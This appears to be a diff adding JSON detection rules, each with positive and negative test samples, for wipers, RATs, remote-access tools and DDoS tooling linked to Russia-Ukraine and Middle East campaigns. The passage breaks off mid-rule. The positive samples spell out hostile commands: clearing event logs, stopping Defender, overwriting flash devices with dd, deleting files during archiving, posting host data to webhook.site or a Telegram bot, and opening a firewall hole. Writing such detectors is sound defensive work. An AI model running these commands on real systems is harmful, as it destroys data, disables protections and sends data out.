+   "technique_name": "Disk Structure Wipe",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": "\\windows\\perfc.dat"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "notpetya",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\perfc.dat",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Windows\\System32\\perfc009.dat",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-notpetya-forced-reboot-task",
+   "name": "schtasks scheduling a forced reboot as SYSTEM",
+   "description": "NotPetya schedules shutdown.exe /r /f via a one-shot SYSTEM task to trigger its MBR payload.",
+   "tactic": "Impact",
+   "technique": "T1529",
+   "technique_name": "System Shutdown/Reboot",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\schtasks.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/create"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "shutdown(\\.exe)?\\s+/r\\s+/f"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/ru"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "notpetya"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /RU SYSTEM /Create /SC once /TN \"\" /TR \"C:\\Windows\\system32\\shutdown.exe /r /f\" /ST 15:30"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /Create /SC weekly /TN patch /TR \"C:\\Windows\\system32\\shutdown.exe /r /t 600\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-notpetya-wevtutil-sweep",
+   "name": "Clearing Setup, System, Security and Application logs in one command",
+   "description": "NotPetya chains wevtutil cl across Setup, System, Security and Application. All four in one command is a strong destructive-run signal.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.001",
+   "technique_name": "T1070.001",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "wevtutil"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bcl\\s+setup\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bcl\\s+system\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bcl\\s+security\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bcl\\s+application\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "notpetya"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wevtutil.exe",
+      "command": "wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wevtutil.exe",
+      "command": "wevtutil cl Application"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-whispergate-advancedrun-defender",
+   "name": "AdvancedRun used to stop Windows Defender",
+   "description": "WhisperGate stage two drops AdvancedRun.exe to run sc.exe stop WinDefend (CISA/FBI AA22-057A, Microsoft).",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "T1562.001",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "advancedrun"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(stop|delete)\\s+windefend|disableantispyware"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "whispergate",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\Temp\\AdvancedRun.exe",
+      "command": "AdvancedRun.exe /EXEFilename \"C:\\Windows\\System32\\sc.exe\" /CommandLine \"stop WinDefend\" /RunAs 8 /Run"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Tools\\AdvancedRun.exe",
+      "command": "AdvancedRun.exe /EXEFilename notepad.exe /Run"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-whispergate-tbopbh-fetch",
+   "name": "Stage download named Tbopbh.jpg (WhisperGate)",
+   "description": "WhisperGate stage one fetches stage two disguised as Tbopbh.jpg from a Discord CDN path.",
+   "tactic": "Command and Control",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "network",
+   "match": {
+    "all": [
+     {
+      "field": "destination",
+      "op": "contains",
+      "pattern": "tbopbh.jpg"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "whispergate",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "destination": "cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "cdn.discordapp.com/attachments/1/2/logo.png"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-hermeticwiper-driver",
+   "name": "HermeticWiper partition driver dropped",
+   "description": "HermeticWiper drops a signed EaseUS partition-manager driver (epmntdrv.sys, also spelled empntdrv.sys) to reach raw disk.",
+   "tactic": "Impact",
+   "technique": "T1561.002",
+   "technique_name": "Disk Structure Wipe",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "patterns": [
+       "\\epmntdrv.sys",
+       "\\empntdrv.sys"
+      ]
+     },
+     {
+      "not": {
+       "field": "path",
+       "op": "contains",
+       "pattern": "\\program files"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "hermeticwiper",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\System32\\drivers\\epmntdrv.sys",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Program Files\\EaseUS\\Partition Master\\epmntdrv.sys",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-caddywiper-binary",
+   "name": "caddy.exe executed from Temp or Windows directory",
+   "description": "CaddyWiper was deployed as caddy.exe, often via GPO (ESET, CISA AA22-057A). Name-based and easy to evade, hence medium.",
+   "tactic": "Impact",
+   "technique": "T1485",
+   "technique_name": "Data Destruction",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\caddy.exe"
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\temp\\",
+       "\\windows\\",
+       "\\sysvol\\",
+       "\\netlogon\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "caddywiper",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\Temp\\caddy.exe",
+      "command": "caddy.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Caddy\\caddy.exe",
+      "command": "caddy.exe run"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-roarbat-rar-delete",
+   "name": "WinRAR archiving with delete and store flags (RoarBat-style wiping)",
+   "description": "Sandworm's RoarBat wipes by archiving with rar using -df/-dr and -m0 without a useful archive. The combination across directories is destructive.",
+   "tactic": "Impact",
+   "technique": "T1485",
+   "technique_name": "Data Destruction",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(rar|winrar)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-(df|dr)\\b"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-m0"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-r\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "sandworm",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Program Files\\WinRAR\\rar.exe",
+      "command": "rar.exe a -r -dr -m0 -ed -ep1 C:\\x.rar C:\\Users\\*.docx"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\WinRAR\\rar.exe",
+      "command": "rar.exe a -r -m5 backup.rar C:\\docs"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-acidrain-dd-mtd",
+   "name": "dd writing to MTD flash block devices (AcidRain)",
+   "description": "AcidRain, used against Viasat modems in Ukraine (2022), wipes /dev/mtdblock*, /dev/mtd* and similar device nodes.",
+   "tactic": "Impact",
+   "technique": "T1561.001",
+   "technique_name": "Disk Content Wipe",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bdd\\b.*\\bof=/dev/(mtd|mtdblock|mmcblk|ubi)\\w*"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "if=/dev/(zero|urandom|random)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "acidrain",
+    "wiper",
+    "linux"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/zero of=/dev/mtdblock3 bs=1M"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/dd",
+      "command": "dd if=/dev/zero of=/tmp/test.img bs=1M count=10"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-netlogon-exe-launch",
+   "name": "Executable launched directly from a NETLOGON or SYSVOL share",
+   "description": "Binaries run straight from NETLOGON or SYSVOL were used to mass-deploy wipers and ransomware (Industroyer2 era, Agrius, CaddyWiper). Logon scripts also live there, so low.",
+   "tactic": "Lateral Movement",
+   "technique": "T1021.002",
+   "technique_name": "SMB/Windows Admin Shares",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "^\\\\\\\\[^\\\\]+\\\\(netlogon|sysvol)\\\\.*\\.exe$"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "gpo",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "\\\\dc01.corp.local\\NETLOGON\\x.exe",
+      "command": "x.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c echo"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-webhook-service-fetch",
+   "name": "Command line contacting free webhook or mock-API services",
+   "description": "curl/PowerShell reaching webhook.site, mocky.io, mockbin.org or pipedream.net. CERT-UA and others documented APT28 using these as free relays. Developers use them too, so low.",
+   "tactic": "Exfiltration",
+   "technique": "T1567",
+   "technique_name": "Exfiltration Over Web Service",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(powershell|pwsh|curl|cmd)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(webhook\\.site|mocky\\.io|mockbin\\.org|pipedream\\.net|requestbin\\.)"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "apt28",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\powershell.exe",
+      "command": "powershell -c iwr https://webhook.site/abcd -Method POST -Body $env:COMPUTERNAME"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\powershell.exe",
+      "command": "powershell -c iwr https://example.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-telegram-bot-api-script",
+   "name": "Script contacting the Telegram Bot API",
+   "description": "PowerShell, curl or a script host reaching api.telegram.org/bot... is a C2 and exfiltration channel used by Dark Pink (SE Asia), Konni, and Ukraine-focused clusters.",
+   "tactic": "Command and Control",
+   "technique": "T1102",
+   "technique_name": "Web Service",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(powershell|pwsh|curl|wscript|cscript|mshta)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "api\\.telegram\\.org/bot"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "sea",
+    "telegram",
+    "c2"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\powershell.exe",
+      "command": "powershell -c iwr https://api.telegram.org/bot123:AAA/sendDocument"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\powershell.exe",
+      "command": "powershell -c iwr https://api.github.com/repos"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-mhddos-db1000n",
+   "name": "Volunteer or hacktivist DDoS tooling (mhddos, db1000n)",
+   "description": "Command lines for mhddos, db1000n or similar scripted DDoS tools used by both sides of the Russia-Ukraine conflict. Low: it may be sanctioned in some contexts.",
+   "tactic": "Impact",
+   "technique": "T1498",
+   "technique_name": "Network Denial of Service",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(mhddos(_proxy)?|db1000n|bobik)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "ua",
+    "ddos",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 runner.py mhddos_proxy --threads 1000"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 runner.py --help"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-ammyy-admin",
+   "name": "Ammyy Admin remote tool executed",
+   "description": "Ammyy Admin was widely abused by Russian-speaking financial-crime crews (Cobalt, Silence, Buhtrap).",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\ammyy.exe",
+       "\\aa_v3.exe",
+       "\\ammyyadmin.exe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "rmm",
+    "cobalt",
+    "silence"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\Downloads\\AA_v3.exe",
+      "command": "AA_v3.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\notepad.exe",
+      "command": "notepad.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-radmin-silent-install",
+   "name": "Radmin Server silent install",
+   "description": "r_server.exe /silence or /install registers the Russian-origin Radmin Server unattended. Abused for persistent hands-on access.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\r_server.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/(silence|install)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "rmm",
+    "radmin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\SysWOW64\\rserver30\\r_server.exe",
+      "command": "r_server.exe /silence /install"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\SysWOW64\\rserver30\\r_server.exe",
+      "command": "r_server.exe /setup"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-rms-rutserv-offpath",
+   "name": "Remote Utilities (rutserv) running from a user-writable path",
+   "description": "RMS/Remote Utilities host (rutserv.exe) from Temp, AppData or ProgramData. Reported with Iranian (MuddyWater) and Eastern European intrusions.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\rutserv.exe",
+       "\\rfusclient.exe"
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "me",
+    "rmm",
+    "muddywater"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\Temp\\rutserv.exe",
+      "command": "rutserv.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe",
+      "command": "rutserv.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-ru-litemanager-offpath",
+   "name": "LiteManager server running from a user-writable path",
+   "description": "romserver.exe or romfusclient.exe outside Program Files. LiteManager is a Russian-origin tool seen in financial-crime intrusions; legitimate admin use exists.",
+   "tactic": "Command and Control",
+   "technique": "T1219",
+   "technique_name": "Remote Access Tools",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\romserver.exe",
+       "\\romfusclient.exe"
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "ru",
+    "rmm",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\ProgramData\\lm\\romserver.exe",
+      "command": "romserver.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files (x86)\\LiteManager Pro - Server\\romserver.exe",
+      "command": "romserver.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-shamoon-rawdisk-driver",
+   "name": "Shamoon RawDisk driver (drdisk.sys)",
+   "description": "Shamoon 2/3 wipers load the EldoS RawDisk driver as drdisk.sys from System32 (Saudi and wider Gulf campaigns).",
+   "tactic": "Impact",
+   "technique": "T1561.002",
+   "technique_name": "Disk Structure Wipe",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": "\\drdisk.sys"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "shamoon",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\System32\\drdisk.sys",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Windows\\System32\\drivers\\disk.sys",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-shamoon-trksvr-service",
+   "name": "Service ImagePath pointing at trksvr.exe or ntssrv.exe",
+   "description": "Shamoon 1 masquerades as the Distributed Link Tracking service via trksvr.exe; Shamoon 2 used NtsSrv/ntssrv.exe. Genuine TrkSvr runs under svchost.",
+   "tactic": "Persistence",
+   "technique": "T1543.003",
+   "technique_name": "Windows Service",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "contains",
+      "pattern": "\\services\\"
+     },
+     {
+      "field": "value_data",
+      "op": "suffix",
+      "patterns": [
+       "\\trksvr.exe",
+       "\\ntssrv.exe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "shamoon",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TrkSvr",
+       "value_name": "ImagePath",
+       "value_data": "C:\\Windows\\System32\\trksvr.exe",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TrkWks",
+       "value_name": "ImagePath",
+       "value_data": "C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-zerocleare-elrawdsk",
+   "name": "EldoS RawDisk driver (ZeroCleare)",
+   "description": "ZeroCleare pairs a vulnerable VirtualBox driver with the EldoS RawDisk driver (elrawdsk.sys) for destructive disk access (IBM X-Force, Gulf energy sector).",
+   "tactic": "Impact",
+   "technique": "T1561.002",
+   "technique_name": "Disk Structure Wipe",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": "\\elrawdsk.sys"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "zerocleare",
+    "wiper"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\Temp\\elrawdsk.sys",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Windows\\Temp\\raw.log",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-moses-diskcryptor-driver",
+   "name": "DiskCryptor driver (dcrypt.sys) written outside Program Files",
+   "description": "Moses Staff (Iran-linked, Israeli targets) deployed DiskCryptor via PyDCrypt/DCSrv, dropping dcrypt.sys.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": "\\dcrypt.sys"
+     },
+     {
+      "not": {
+       "field": "path",
+       "op": "contains",
+       "pattern": "\\program files"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "moses-staff",
+    "ransomware"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\System32\\drivers\\dcrypt.sys",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Program Files\\DiskCryptor\\dcrypt.sys",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-darkcomet-dclogs",
+   "name": "DarkComet keylogger data directory",
+   "description": "DarkComet writes captured data under %APPDATA%\\dclogs\\. The RAT has long been used in Middle East espionage and conflict-related campaigns.",
+   "tactic": "Collection",
+   "technique": "T1056.001",
+   "technique_name": "Keylogging",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "contains",
+      "pattern": "\\appdata\\roaming\\dclogs\\"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "darkcomet",
+    "rat"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\dclogs\\2024-01-01.dc",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\logs\\a.txt",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-darkcomet-registry",
+   "name": "DarkComet DC3_FEXEC registry value",
+   "description": "DarkComet stores its persistence marker under HKCU\\Software\\DC3_FEXEC.",
+   "tactic": "Persistence",
+   "technique": "T1112",
+   "technique_name": "Modify Registry",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "contains",
+      "pattern": "\\software\\dc3_fexec"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "darkcomet",
+    "rat"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\DC3_FEXEC",
+       "value_name": "",
+       "value_data": "C:\\Users\\ann\\AppData\\Roaming\\msdcsc.exe",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Microsoft\\Notepad",
+       "value_name": "x",
+       "value_data": "y",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-njrat-netsh-allowedprogram",
+   "name": "netsh firewall allowedprogram for a user-writable binary (njRAT)",
+   "description": "njRAT punches a firewall hole with netsh firewall add allowedprogram. Heavily used across the Middle East and North Africa.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.004",
+   "technique_name": "T1562.004",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\netsh.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "firewall\\s+add\\s+allowedprogram"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "njrat",
+    "rat"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\netsh.exe",
+      "command": "netsh firewall add allowedprogram \"C:\\Users\\ann\\AppData\\Local\\Temp\\svchost.exe\" \"svchost.exe\" ENABLE"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\netsh.exe",
+      "command": "netsh advfirewall show allprofiles"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-njrat-kl-registry",
+   "name": "njRAT keylogger registry value [kl]",
+   "description": "njRAT keeps keystroke data in a [kl] value under a 32-hex key in HKCU\\Software.",
+   "tactic": "Collection",
+   "technique": "T1056.001",
+   "technique_name": "Keylogging",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\software\\\\[0-9a-f]{32}$"
+     },
+     {
+      "field": "value_name",
+      "op": "equals",
+      "pattern": "[kl]"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "njrat",
+    "rat"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\0123456789abcdef0123456789abcdef",
+       "value_name": "[kl]",
+       "value_data": "aGk=",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\0123456789abcdef0123456789abcdef",
+       "value_name": "Version",
+       "value_data": "1",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-oilrig-iis-module-install",
+   "name": "IIS native module installed via appcmd",
+   "description": "appcmd install module registers an IIS module. Malicious modules (RGDoor by OilRig, IISpy, others) are a way to persist in Middle East government hosting.",
+   "tactic": "Persistence",
+   "technique": "T1505.004",
+   "technique_name": "IIS Components",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\appcmd.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "install\\s+module"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "/image:",
+       "\\users\\",
+       "\\temp\\",
+       "\\programdata\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "me",
+    "oilrig",
+    "iis"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\inetsrv\\appcmd.exe",
+      "command": "appcmd.exe install module /name:HttpCacheModule /image:C:\\Windows\\Temp\\m.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\inetsrv\\appcmd.exe",
+      "command": "appcmd.exe list sites"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-me-foxkitten-plink-rdp-tunnel",
+   "name": "plink/ssh reverse tunnel to local RDP",
+   "description": "A reverse SSH tunnel carrying 3389, a hallmark of Fox Kitten (Iran-nexus) access to VPN-connected hosts per CISA/FBI advisories.",
+   "tactic": "Command and Control",
+   "technique": "T1572",
+   "technique_name": "Protocol Tunneling",
